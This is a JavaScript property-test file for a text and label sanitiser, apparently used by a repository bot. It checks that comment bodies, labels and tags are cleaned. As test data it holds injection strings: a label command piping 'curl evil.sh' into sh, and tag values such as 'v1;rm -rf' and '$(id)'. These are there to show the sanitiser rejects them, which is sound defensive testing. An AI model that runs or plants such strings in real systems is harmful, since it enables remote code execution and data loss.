// Property tests for the effect sanitiser. Run: node --test internal/effects/js/
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const S = require('./sanitize.js');

// Deterministic PRNG so failures reproduce.
function rng(seed) {
  let x = seed >>> 0 || 1;
  return () => ((x ^= x << 13), (x ^= x >>> 17), (x ^= x << 5), (x >>> 0) / 4294967296);
}
const pieces = ['``', '`@', '`#1`', '<!--', '-->', '<!-', '->', '-', '@', '@octocat', '@org/team', '#', '#12', '`', ' ', '\n', '\r', '\t',
  'http://x.y/', 'https://a.b/c?d=e', 'a', 'Z', '9', 'é', '日', '\u0000', '\u0007', '\u001b', '\u007f', '\u0085',
  '​', '‎', ' ', '‮', '⁦', '﻿', '&#', '<', '>', '<script>', '"', "'", '$', '{{ actor }}', '😀'];
function randomString(r, n) {
  let s = '';
  for (let i = 0; i < n; i++) s += pieces[Math.floor(r() * pieces.length)];
  return s;
}
const CTRL = new RegExp(S.stripControl.toString().match(/replace\(\/(\[\\u0000[^\/]*\])\/g/)[1]);
const bytes = (s) => new TextEncoder().encode(s).length;

test('sanitizeBody invariants hold for random input', () => {
  const r = rng(20261031);
  for (let i = 0; i < 20000; i++) {
    const input = randomString(r, Math.floor(r() * 60));
    const maxBytes = 64 + Math.floor(r() * 200);
    const maxLinks = Math.floor(r() * 3);
    const out = S.sanitizeBody(input, { maxBytes, maxLinks, allowMentions: ['allowed'] });
    const ctx = `input ${JSON.stringify(input)} -> ${JSON.stringify(out)}`;
    assert.ok(!out.includes('<!--'), `HTML comment opener survived: ${ctx}`);
    // The only invisible characters allowed are the zero-width spaces we insert after @ and #.
    assert.ok(!CTRL.test(out.replace(/[@#]\u200b/g, '')), `control character survived: ${ctx}`);
    assert.ok(!out.includes('\r'), `CR survived: ${ctx}`);
    assert.ok(bytes(out) <= maxBytes, `over ${maxBytes} bytes: ${ctx}`);
    assert.ok((out.match(/https?:\/\//g) || []).length <= maxLinks, `too many links: ${ctx}`);
    assert.ok(!/(?<!\w)@(?!allowed\b)[A-Za-z0-9]/.test(out), `bare @mention survived: ${ctx}`);
    assert.ok(!/(?<!&)#\d/.test(out), `bare #ref survived: ${ctx}`);
    assert.strictEqual(S.sanitizeBody(out, { maxBytes, maxLinks, allowMentions: ['allowed'] }), out, `not idempotent: ${ctx}`);
  }
});

test('allowlisted mention stays a mention', () => {
  assert.strictEqual(S.sanitizeBody('thanks @octocat!', { allowMentions: ['OctoCat'] }), 'thanks @octocat!');
  assert.strictEqual(S.sanitizeBody('thanks @octocat!'), 'thanks @\u200boctocat!');
  assert.strictEqual(S.sanitizeBody('see org/repo#12 and &#64;'), 'see org/repo#\u200b12 and &#64;');
});

test('byte cap never splits a character', () => {
  const out = S.sanitizeBody('é'.repeat(100), { maxBytes: 40 });
  assert.ok(bytes(out) <= 40);
  assert.ok(!out.includes('�'));
});

test('labels from a comment command', () => {
  assert.deepStrictEqual(S.labelsFromComment('/label bug, docs\nmore text /label evil', '/label '), ['bug', 'docs']);
  assert.deepStrictEqual(S.labelsFromComment("/label x'; curl evil.sh | sh", '/label '), ["x';", 'curl', 'evil.sh', '|', 'sh']);
  assert.deepStrictEqual(S.labelsFromComment('no command', '/label '), []);
});

test('label filter: allowlist, dedupe, max', () => {
  const r = S.filterLabels(['bug', 'bug', "x';", 'curl', 'docs', 'question'], ['bug', 'docs', 'question'], 2);
  assert.deepStrictEqual(r.labels, ['bug', 'docs']);
  assert.deepStrictEqual(r.rejected, ["x';", 'curl']);
  assert.deepStrictEqual(r.dropped, ['question']);
});

test('label filter never returns anything outside the allowlist', () => {
  const r = rng(7);
  const allowed = ['bug', 'docs', 'good first issue'];
  for (let i = 0; i < 5000; i++) {
    const req = randomString(r, 20).split(/[\s,]+/);
    for (const l of S.filterLabels(req, allowed, 3).labels) assert.ok(allowed.includes(l));
  }
});

test('tag validation', () => {
  for (const ok of ['v1.2.3', 'release/v1', 'v1.0.0-rc.1']) assert.ok(S.validTag(ok), ok);
  for (const bad of ['', 'v1;rm -rf', 'a b', '../etc', '/abs', 'trail/', 'x'.repeat(129), '$(id)', 'v1\n']) assert.ok(!S.validTag(bad), JSON.stringify(bad));
});

test('template renders only known placeholders, without control characters', () => {
  assert.strictEqual(S.renderTemplate('Labelled by @{{ actor }}.', { actor: 'octo\u0000cat' }), 'Labelled by @octocat.');
  assert.strictEqual(S.renderTemplate('{{ nope }}x', {}), 'x');
});
